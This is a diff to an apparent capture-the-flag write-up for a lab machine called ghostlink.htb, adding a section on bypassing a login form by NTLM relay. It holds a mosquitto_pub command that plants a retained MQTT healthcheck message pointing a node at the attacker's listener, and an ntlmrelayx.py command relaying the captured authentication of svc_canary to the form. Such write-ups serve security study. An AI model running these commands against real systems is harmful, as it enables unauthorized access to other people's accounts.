@@ -407,14 +407,19 @@ vulnerable version
 CVE-2025-8110 (RCE authenticated - Gravità Alta/Critica) 
 
 
-Enumerating 
+Enumerating gpz-op26-secure.ghostlink.htb presents a login form
 
-## More relaying
+![](./screens/3.png)
+
+## Bypassing the login with NTLM relay
 
 ```
  mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
   -m '{"timestamp":"2026-29-10-21:24:27","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.148:8888/healthcheck","lastCheckSecAgo":42,"responseCode":"200","ip":"172.16.20.10"}}'
 ```
+
+As the svc_canary user is discovered, even without the password its possible to hijack his session and authenticate directly to the form, here the page gives back a 200 ok and displays the contents:
+
 
 ```
 python3 ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 --keep-relaying
@@ -517,6 +522,8 @@ editing config.py
 ```
 nano lib/relay/utils/config.py 
 ```
+
+![](./screens/5.png)
 
 # Summary
 
